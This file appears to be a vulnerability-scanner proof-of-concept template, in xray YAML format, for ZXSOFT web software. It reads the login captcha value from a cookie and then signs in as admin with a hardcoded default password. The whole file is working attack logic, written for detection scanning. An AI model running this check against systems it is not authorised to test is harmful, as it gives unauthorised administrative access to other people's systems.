name: poc-yaml-zxsoft-default-account-password
manual: true
transport: http
set:
    r5: randomInt(1000000000, 9999999999)
rules:
    r0:
        request:
            method: GET
            path: "/?q=common/getcode/rand/0.{{r5}}"
            follow_redirects: false
        expression: |
            response.status == 200 && response.headers["Set-Cookie"].contains("check_code=")
        output:
            search: |
              r'check_code=(?P<code>\w{4}); '.bsubmatch(response.raw)
            code: search['code']

    r1:
        request:
            method: GET
            path: "/index.php/?q=common/getcode/rand/0.{{r5}}"
            follow_redirects: false
        expression: |
            response.status == 200 && response.headers["Set-Cookie"].contains("check_code=")
        output:
            search: |
              r'check_code=(?P<code>\w{4}); '.bsubmatch(response.raw)
            code: search['code']

    r2:
        request:
            method: POST
            path: /?q=common/login
            headers:
              Content-Type: application/x-www-form-urlencoded
            body: name=admin&password=zxsoft1234!%40%23%24&checkcode={{code}}&doLoginSubmit=1
            follow_redirects: false
        expression: |
            response.status == 200 && response.body == b"1" && response.headers["Set-Cookie"].contains(" ZXSOFT_JDIS_USR_NAME=") && response.headers["Set-Cookie"].contains("ZXSOFT_JDIS_USR_LOCK=")

expression: (r0() || r1()) && r2()

detail:
    author: kzaopa(https://github.com/kzaopa)
    links:
        - https://mp.weixin.qq.com/s/DWuUlbtFU-MiGE3zw1w8Yg